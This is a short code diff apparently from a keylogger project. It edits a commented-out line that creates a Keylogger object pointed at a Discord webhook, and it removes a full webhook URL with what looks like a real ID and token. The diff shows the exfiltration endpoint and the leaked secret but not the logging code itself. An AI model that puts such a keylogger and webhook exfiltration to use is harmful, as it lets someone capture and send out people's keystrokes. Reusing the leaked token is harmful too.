@@ -108,5 +108,5 @@ class Keylogger:
         except:
             pass
 
-#Logger = Keylogger("https://discord.com/api/webhooks/ID/TOKEN")  #https://discord.com/api/webhooks/1108145112506187896/TlKDPZOVnmPE9weYvVcJmR_3UvERuWDuBSUSD2eu-km9U1OHlUF7XOHjhqZ7Uf3-cQT9"
+#Logger = Keylogger("https://discord.com/api/webhooks/ID/TOKEN")
 #Logger.run()
